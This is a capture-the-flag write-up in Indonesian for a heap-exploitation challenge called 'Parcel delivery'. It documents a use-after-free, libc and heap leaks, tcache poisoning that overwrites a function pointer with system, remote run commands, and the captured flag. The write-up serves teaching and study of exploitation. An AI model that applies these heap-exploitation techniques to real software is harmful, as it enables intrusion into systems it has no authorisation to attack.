# Parcel delivery

## Ringkasan

Vulnerability utamanya adalah use-after-free pada array `parcels`. `destroy_parcel()` memanggil `free()` tetapi pointer dan ukuran slot tidak pernah di-reset. Akibatnya chunk yang sudah di-free masih bisa dibaca lewat `inspect_parcel()` dan masih bisa ditulis lewat `update_parcel()`.

Primitive akhirnya:

- Leak libc dari metadata unsorted bin pada chunk besar yang sudah di-free.
- Leak heap dari safe-linking value pada chunk tcache kecil yang sudah di-free.
- Tcache poisoning untuk mengarahkan alokasi ke `.data`.
- Overwrite `delivery_hook` dengan `system`, lalu trigger lewat menu `Dispatch parcel`.

## Proteksi Binary

Output penting:

```text
$ file ./parcel_delivery
ELF 64-bit LSB executable, x86-64, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, not stripped

$ checksec --file=./parcel_delivery
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
SHSTK: Enabled
IBT: Enabled
Stripped: No
```

Implikasinya:

- `No PIE`: alamat simbol binary tetap. `delivery_hook` selalu berada di `0x404068`.
- `NX enabled`: shellcode di stack/heap bukan jalur termudah.
- `No canary`: stack overflow tetap mungkin kalau ada bug stack, tapi challenge ini lebih mudah lewat heap.
- `Partial RELRO`: GOT masih writable, tapi tidak dibutuhkan karena ada function pointer global.
- `SHSTK` dan `IBT`: ret2libc biasa jadi kurang menarik. Mengganti function pointer ke fungsi libc yang punya `endbr64` jauh lebih bersih.

## Analisis Program

Fungsi penting hasil disassembly:

```text
normal_delivery   @ 0x401276
express_delivery  @ 0x4012a4
register_parcel   @ 0x40133c
inspect_parcel    @ 0x4014a4
update_parcel     @ 0x401527
destroy_parcel    @ 0x4015b4
dispatch          @ 0x401610
delivery_hook     @ 0x404068
```

`dispatch()` membaca tracking code ke buffer stack 64 byte dengan `scanf("%63s", buf)` lalu memanggil function pointer global:

```asm
40164b: mov    rdx,QWORD PTR [rip+0x2a16]  ; delivery_hook
401652: lea    rax,[rbp-0x40]
401656: mov    rdi,rax
401659: call   rdx
```

Isi awal `delivery_hook` adalah `normal_delivery`:

```text
0x404068 <delivery_hook>: 0x0000000000401276
```

## Vulnerability

`destroy_parcel()`:

```asm
4015ff: mov    rax,QWORD PTR [rdx+rax*1]
401603: mov    rdi,rax
401606: call   free@plt
```

Tidak ada penulisan `parcels[idx] = NULL` atau `sizes[idx] = 0` setelah `free()`.

`inspect_parcel()` masih membaca pointer lama:

```asm
4014ef: mov    rdx,QWORD PTR [rdx+rax*1]   ; sizes[idx]
401507: mov    rax,QWORD PTR [rcx+rax*1]   ; parcels[idx]
401513: call   write@plt
```

`update_parcel()` juga masih menulis ke pointer lama:

```asm
401586: mov    rdx,QWORD PTR [rdx+rax*1]   ; sizes[idx]
40159e: mov    rax,QWORD PTR [rcx+rax*1]   ; parcels[idx]
4015aa: call   read@plt
```

Itu membuktikan UAF read dan UAF write.

## Menentukan Primitive

### 1. Leak libc

Register slot besar `0x500`, lalu buat guard chunk kecil setelahnya supaya chunk besar tidak terkonsolidasi ke top chunk saat di-free.

Setelah `free(slot0)`, `inspect(slot0)` mengeluarkan metadata unsorted bin:

```text
first16 203be04f3c780000203be04f3c780000
u64fd 0x783c4fe03b20
u64bk 0x783c4fe03b20
```

Pada glibc Ubuntu 24.04 lokal, `&main_arena = 0x203ac0`. Pointer unsorted yang keluar adalah `main_arena + 0x60`, jadi:

```text
libc_base = fd - 0x60 - 0x203ac0
```

### 2. Leak heap

Alokasikan dua chunk kecil dengan request `0x18`, lalu free berurutan.

Leak dari chunk pertama:

```text
slot0 leak first8 = 0x0000000000033ba8
```

Itu adalah `chunk_A >> 12` karena `next = NULL`.

Leak dari chunk kedua:

```text
slot1 leak first8 = 0x0000000033b9b968
```

Nilai ini adalah safe-linked pointer `chunk_A ^ (chunk_B >> 12)`.

Dengan stride chunk kecil `0x30`, alamat chunk valid yang memenuhi persamaan adalah:

```text
chunk_A = 0x...2c0
chunk_B = chunk_A + 0x30
```

### 3. Arbitrary write via tcache poisoning

Overwrite `fd` milik chunk `B` yang sudah di-free lewat `update_parcel(3, ...)`.

Target langsung `0x404068` gagal karena tidak 16-byte aligned sebagai pointer hasil `malloc()`. Target yang dipakai adalah `0x404060`, lalu `system` ditulis pada offset `+8`, tepat mengenai `delivery_hook`.

Encoding safe-linking:

```text
poisoned_fd = 0x404060 ^ (chunk_B >> 12)
```

Setelah itu:

1. `malloc(0x18)` pertama mengambil chunk `B`.
2. `malloc(0x18)` kedua mengembalikan pointer palsu `0x404060`.
3. Data `b"PADDING!" + p64(system) + ...` menimpa `delivery_hook`.

## Strategi Exploit

Urutan final:

1. Leak libc dari unsorted bin.
2. Leak heap dari tcache safe-linking.
3. Poison tcache ke `0x404060`.
4. Tulis `system` ke `delivery_hook`.
5. Panggil menu `Dispatch parcel`.
6. Kirim `cat</flag.txt`.

Payload command tidak boleh mengandung spasi karena `dispatch()` memakai `scanf("%63s")`. `cat</flag.txt` tetap satu token shell dan berhasil mencetak isi flag.

## Pengembangan Payload

Exploit final ada di [solve.py](/home/nata/ctf/NNSCTF/pwn/Parceldelivery/pwn_parcel-delivery/solve.py).

Bagian penting:

- `leak_libc()`: ambil pointer `main_arena+0x60` dari unsorted bin.
- `recover_small_chunk_addresses()`: rekonstruksi alamat heap dari safe-linking leak.
- `overwrite_delivery_hook()`: tcache poisoning ke `.data`, lalu overwrite `delivery_hook`.
- `dispatch(io, b"cat</flag.txt")`: trigger `system`.

## Cara Menjalankan

Lokal:

```bash
python3 solve.py
python3 solve.py GDB
```

Remote challenge:

```bash
python3 solve.py REMOTE
python3 solve.py REMOTE HOST=parcel-delivery-13cf6b60cf85.chall.nnsc.tf PORT=1337
```

Optional:

```bash
python3 solve.py REMOTE CMD='cat</flag.txt'
python3 solve.py LIBC=/path/to/libc.so.6 REMOTE
```

## Hasil

Output remote yang terbukti:

```text
[*] libc base = 0x7f7ffe87f000
[*] chunk A = 0x3263e2c0
[*] chunk B = 0x3263e2f0
NNS{p4rc3l_5ucc355fully_d3l1v3r3d_114d4aaa0a}
```

<FLAG>NNS{p4rc3l_5ucc355fully_d3l1v3r3d_114d4aaa0a}</FLAG>

## Catatan Stabilitas

- Exploit tidak memakai hardcoded ASLR address. Base libc dihitung dari leak unsorted bin.
- Alamat heap juga tidak di-hardcode. Script merekonstruksi chunk dari safe-linking leak.
- `docker` tidak tersedia di environment WSL ini, jadi validasi lokal penuh dengan `/flag.txt` containerized tidak dijalankan dari host ini. Primitive lokal dan exploit remote keduanya berhasil.
- Asumsi libc berasal dari image `ubuntu:24.04` pada `Dockerfile`, cocok dengan host lokal yang dipakai saat analisis.
